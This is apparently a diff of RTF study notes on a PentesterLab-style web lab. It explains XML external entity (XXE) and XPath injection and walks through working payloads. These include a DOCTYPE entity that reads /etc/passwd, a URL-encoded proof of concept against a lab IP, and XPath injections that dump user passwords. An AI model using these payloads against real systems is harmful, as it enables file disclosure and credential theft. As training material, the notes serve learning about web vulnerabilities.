@@ -1,8 +1,10 @@
 {\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
 {\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;\f2\fmodern\fcharset0 Courier;
 }
-{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red127\green127\blue127;\red0\green0\blue0;
-\red251\green0\blue7;}
+{\colortbl;\red255\green255\blue255;\red127\green127\blue127;\red251\green0\blue7;\red0\green0\blue0;
+}
+{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid1\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid1}}
+{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}}
 \paperw11900\paperh16840\margl1440\margr1440\vieww19400\viewh11220\viewkind0
 \pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
 
@@ -11,17 +13,17 @@
 \
 \pard\pardeftab720\sl280\partightenfactor0
 
-\f1\fs28 \cf2 \expnd0\expndtw0\kerning0
-\outl0\strokewidth0 \strokec2 External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
-\f0\fs32 \cf0 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 \
+\f1\fs28 \cf0 \expnd0\expndtw0\kerning0
+External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
+\f0\fs32 \kerning1\expnd0\expndtw0 \
 \pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
 \cf0 \
 \ul Example 1\
 \ulnone \
 \pard\pardeftab720\sl280\partightenfactor0
 
-\f2\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
-\outl0\strokewidth0 \strokec2 <?php require_once("../header.php"); ?>\
+\f2\fs24 \cf0 \cb2 \expnd0\expndtw0\kerning0
+<?php require_once("../header.php"); ?>\
 Hello  \
 <?php\
   $xml=simplexml_load_string($_GET['xml']);\
@@ -30,29 +32,29 @@ Hello  \
 <?php require_once("../footer.php"); ?>\cb1 \
 \pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
 
-\f0\fs32 \cf0 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 \
+\f0\fs32 \cf0 \kerning1\expnd0\expndtw0 \
 \pard\pardeftab720\sl280\sa240\partightenfactor0
 
-\f1\fs28 \cf2 \expnd0\expndtw0\kerning0
-\outl0\strokewidth0 \strokec2 Attacking payload (read system file: /etc/passwd):\
+\f1\fs28 \cf0 \expnd0\expndtw0\kerning0
+Attacking payload (read system file: /etc/passwd):\
 \pard\pardeftab720\sl280\sa240\partightenfactor0
 
-\f2 \cf4 \cb3 <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+\f2 \cf0 \cb2 <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
 \f1 \
 \pard\pardeftab720\sl280\sa240\partightenfactor0
-\cf2 \cb1 PoC (with URL encoded):\
+\cf0 \cb1 PoC (with URL encoded):\
 \pard\pardeftab720\sl280\sa240\partightenfactor0
 
-\f2 \cf2 \cb3 http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E
+\f2 \cf0 \cb2 http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E
 \f1 \
 \pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
 
-\f0\fs32 \cf0 \cb1 \kerning1\expnd0\expndtw0 \ul \ulc0 \outl0\strokewidth0 Example 2\
+\f0\fs32 \cf0 \cb1 \kerning1\expnd0\expndtw0 \ul Example 2\
 \ulnone \
 \pard\pardeftab720\sl280\partightenfactor0
 
-\f2\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
-\outl0\strokewidth0 \strokec2 <?php require_once("../header.php");\
+\f2\fs24 \cf0 \cb2 \expnd0\expndtw0\kerning0
+<?php require_once("../header.php");\
 \
   $x = "<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>";\
 \
@@ -66,17 +68,118 @@ Hello  \
 \
 \pard\pardeftab720\sl280\sa240\partightenfactor0
 
-\f1\fs28 \cf2 From the source code above, we know that variable $_GET[\'91name\'92] has no input validation and can be used to inject evil code.\
-In order to dump all the users' credentials, I use the payload \'93\cf5 \strokec5 \'91 or 1=1]%00\cf2 \strokec2 \'94 to construct the variable $xpath as follows:\
+\f1\fs28 \cf0 From the source code above, we know that variable $_GET[\'91name\'92] has no input validation and can be used to inject evil code.\
+In order to dump all the users' credentials, I use the payload \'93\cf3 \'91 or 1=1]%00\cf0 \'94 to construct the variable $xpath as follows:\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
 
-\f2 \cb3 users/user/name[.='' or 1=1]%00']/parent::*/message
+\f2 \cf0 \cb2 users/user/name[.='' or 1=1]%00']/parent::*/message
 \f1 \
-\cb1 Here 
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+\cf0 \cb1 Here 
 \i\b %00
 \i0\b0  will get rid of the following strings.
 \f2 \
 \pard\pardeftab720\sl280\partightenfactor0
-\cf2 \cb3 http://.../xml/example2.php?name=%27%20or%201=1]%00
+\cf0 \cb2 http://.../xml/example2.php?name=%27%20or%201=1]%00
 \fs24 \
-\cb1 \
+\pard\pardeftab720\sl280\partightenfactor0
+\cf0 \cb1 \
+\
+\pard\pardeftab720\sl340\sa280\partightenfactor0
+
+\f1\b\fs28 \cf4 \outl0\strokewidth0 \strokec4 Example 3\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\b0 \cf4 Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. The following entity can be declared, for example:\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf4 \cb2 <!ENTITY x SYSTEM "file:///etc/passwd">\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf4 \cb1 You will need to envelope this properly, in order to get it to work correctly:\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf4 \cb2 <!DOCTYPE test [\
+    <!ENTITY x SYSTEM "file:///etc/passwd">]>\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf4 \cb1 You can then simply use the reference to 
+\f2 x
+\f1 : 
+\f2 &x;
+\f1  (don't forget to encode 
+\f2 &
+\f1 ) to get the corresponding result inserted in the XML document during its parsing (server side). \
+In this example, the exploitation occurs directly inside a 
+\f2 GET
+\f1  request, but it's more likely that these types of requests are performed using a 
+\f2 POST
+\f1  request, in a traditional web application. This issue is also really common with web services, and is probably the first test you want to do, when attacking an application that accepts XML messages.\
+This example can also be used to get the application to perform HTTP requests (by using 
+\f2 http://
+\f1  instead of 
+\f2 file://
+\f1 ) and can be used as a port scanner. However, the content retrieved is often incomplete since the XML parser will try to parse it as part of the document. \
+\pard\pardeftab720\sl280\partightenfactor0
+\cf4 You can also use `ftp://` and `https://` \
+\
+\pard\pardeftab720\sl340\sa280\partightenfactor0
+
+\b \cf4 Example 4\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\b0 \cf4 In this example, the code uses the user's input, inside an 
+\b XPath
+\b0  expression. XPath is a query language, which selects nodes from an XML document. Imagine the XML document as a database, and XPath as an SQL query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.\
+If we inject a single quote, we can see the following error:\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf4 \cb2 Warning: SimpleXMLElement::XPath(): Invalid predicate in /var/www/xml/example2.php on line 7 Warning: SimpleXMLElement::XPath(): xmlXPathEval: evaluation failed in /var/www/xml/example2.php on line 7 Warning: Variable passed to each() is not an array or object in /var/www/xml/example2.php on line 8\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf4 \cb1 Just like SQL injection, XPath allows you to do boolean logic, and you can try:\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\sl280\partightenfactor0
+\ls1\ilvl0
+\f2 \cf4 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec4 ' and '1'='1
+\f1  and you should get the same result.\
+\ls1\ilvl0
+\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec4 ' or '1'='0
+\f1  and you should get the same result.\
+\ls1\ilvl0
+\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec4 ' and '1'='0
+\f1  and you should not get any result.\
+\ls1\ilvl0
+\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec4 ' or '1'='1
+\f1  and you should get all results.\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+\cf4 Based on these tests and previous knowledge of XPath, it's possible to get an idea of what the XPath expression looks like:\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf4 \cb2 [PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf4 \cb1 To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a 
+\f2 ]
+\f1  to properly complete the syntax. Our payload now looks like 
+\f2 hacker']%00
+\f1  (or 
+\f2 hacker' or 1=1]%00
+\f1  if we want all results).\
+If we try to find the child of the current node, using the payload 
+\f2 '%20or%201=1]/child::node()%00
+\f1 , we don't get much information.\
+Here, the problem is that we need to get back up in the node hierarchy, to get more information. In XPath, this can be done using 
+\f2 parent::*
+\f1  as part of the payload. We can now select the parent of the current node, and display all the child node using 
+\f2 hacker'%20or%201=1]/parent::*/child::node()%00
+\f1 .\
+One of the node's value looks like a password. We can confirm this, by checking if the node's name is 
+\f2 password
+\f1  using the payload 
+\f2 hacker']/parent::*/password%00
+\f1 .\
 }
